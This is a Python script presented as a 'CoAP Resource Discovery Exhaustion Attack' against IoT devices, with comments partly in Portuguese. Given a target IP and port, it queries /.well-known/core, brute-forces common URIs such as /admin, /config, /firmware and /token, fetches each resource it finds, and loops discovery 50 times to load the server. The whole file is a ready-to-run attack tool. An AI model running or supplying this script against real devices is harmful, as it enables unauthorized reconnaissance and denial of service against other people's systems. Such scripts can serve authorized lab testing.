#!/usr/bin/env python3
"""
CoAP Resource Discovery Exhaustion Attack
"""

import asyncio
import sys
import time
from aiocoap import *
import re

attack_stats = {
    'discovery_queries': 0,
    'resources_discovered': 0,
    'bruteforce_attempts': 0,
    'successful_accesses': 0
}

discovered_resources = set()

class ResourceExhauster:
    def __init__(self, target_host, target_port):
        self.target = f"coap://{target_host}:{target_port}"
    
    async def discover_resources(self):
        """Query .well-known/core para descobrir recursos"""
        
        print("\nQuerying /.well-known/core para resource discovery...")
        
        try:
            protocol = await Context.create_client_context()
            uri = f"{self.target}/.well-known/core"
            
            request = Message(code=GET, uri=uri)
            response = await protocol.request(request).response
            
            attack_stats['discovery_queries'] += 1
            
            # Parse CoRE Link Format (RFC 6690)
            # Formato: </uri>;ct=0;title="Sensor",</uri2>;ct=40
            
            payload = response.payload.decode('utf-8', errors='ignore')
            
            print(f"\nDiscovery response ({len(payload)} bytes):")
            print(f"Payload: {payload[:500]}...\n")
            
            # Extrai URIs usando regex
            uri_pattern = r'<([^>]+)>'
            uris = re.findall(uri_pattern, payload)
            
            for uri in uris:
                discovered_resources.add(uri)
                attack_stats['resources_discovered'] += 1
                print(f"Recurso descoberto: {uri}")
            
            return uris
            
        except Exception as e:
            print(f"Discovery error: {e}")
            return []
    
    async def bruteforce_common_uris(self):
        """Brute force common URIs."""
        
        print("\nStarting common URI brute force...")
        
        common_uris = [
            "/sensor", "/sensors", "/actuator", "/actuators",
            "/api", "/api/v1", "/api/v2",
            "/status", "/health", "/info", "/version",
            "/config", "/settings", "/admin",
            "/temp", "/temperature", "/humidity", "/pressure",
            "/light", "/led", "/relay", "/motor",
            "/data", "/metrics", "/stats",
            "/debug", "/test", "/dev",
            "/firmware", "/update", "/ota",
            "/auth", "/login", "/token",
            "/device", "/devices", "/node", "/nodes",
            "/sensor/1", "/sensor/2", "/sensor/temp",
            "/actuator/1", "/actuator/led",
        ]
        
        for uri in common_uris:
            try:
                protocol = await Context.create_client_context()
                full_uri = f"{self.target}{uri}"
                
                request = Message(code=GET, uri=full_uri)
                response = await asyncio.wait_for(
                    protocol.request(request).response,
                    timeout=2.0
                )
                
                attack_stats['bruteforce_attempts'] += 1
                
                if response.code.is_successful():
                    discovered_resources.add(uri)
                    attack_stats['successful_accesses'] += 1
                    print(f"ENCONTRADO: {uri} ({response.code})")
                    print(f"    └─> Payload: {response.payload[:50]}")
                
            except asyncio.TimeoutError:
                attack_stats['bruteforce_attempts'] += 1
            except Exception:
                attack_stats['bruteforce_attempts'] += 1
    
    async def access_all_discovered(self):
        """Acessa todos os recursos descobertos"""
        
        print(f"\nAcessando todos os {len(discovered_resources)} recursos descobertos...")
        
        for resource in discovered_resources:
            try:
                protocol = await Context.create_client_context()
                uri = f"{self.target}{resource}"
                
                request = Message(code=GET, uri=uri)
                response = await protocol.request(request).response
                
                print(f"[📖] GET {resource}: {response.code}")
                
                await asyncio.sleep(0.1)
                
            except Exception as e:
                pass
    
    async def exhaustive_discovery_loop(self, iterations):
        """Repeated discovery loop to exhaust the server."""
        
        print(f"\nRunning discovery loop ({iterations} iterations)...")
        
        for i in range(iterations):
            await self.discover_resources()
            await asyncio.sleep(0.5)
            
            if i % 10 == 0:
                print(f"Iteration {i}/{iterations}")
    
    async def launch_attack(self):
        """Launch the full attack."""
        
        print("\nStarting CoAP Resource Discovery Exhaustion Attack...\n")
        
        # Phase 1: Initial discovery
        print("=" * 70)
        print("PHASE 1: Resource Discovery")
        print("=" * 70)
        await self.discover_resources()
        
        await asyncio.sleep(2)
        
        # Phase 2: Brute force
        print("\n" + "=" * 70)
        print("PHASE 2: URI Brute Force")
        print("=" * 70)
        await self.bruteforce_common_uris()
        
        await asyncio.sleep(2)
        
        # Phase 3: Exhaustive access
        print("\n" + "=" * 70)
        print("PHASE 3: Exhaustive Access")
        print("=" * 70)
        await self.access_all_discovered()
        
        await asyncio.sleep(2)
        
        # Phase 4: Discovery loop
        print("\n" + "=" * 70)
        print("PHASE 4: Discovery Exhaustion Loop")
        print("=" * 70)
        await self.exhaustive_discovery_loop(50)
        
        # Final report
        print("\n" + "=" * 70)
        print("CoAP Resource Discovery Exhaustion Complete!")
        print("=" * 70)
        print(f"Discovery queries: {attack_stats['discovery_queries']}")
        print(f"Discovered resources: {len(discovered_resources)}")
        print(f"Brute-force attempts: {attack_stats['bruteforce_attempts']}")
        print(f"Successful accesses: {attack_stats['successful_accesses']}")
        print("\nMapped resources:")
        for res in sorted(discovered_resources):
            print(f"  - {res}")
        print("=" * 70)

async def main():
    if len(sys.argv) < 3:
        print("Uso: python3 attack.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print("=" * 70)
    print(f"Target: {target_host}:{target_port}")
    print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    exhauster = ResourceExhauster(target_host, target_port)
    await exhauster.launch_attack()

if __name__ == "__main__":
    asyncio.run(main())
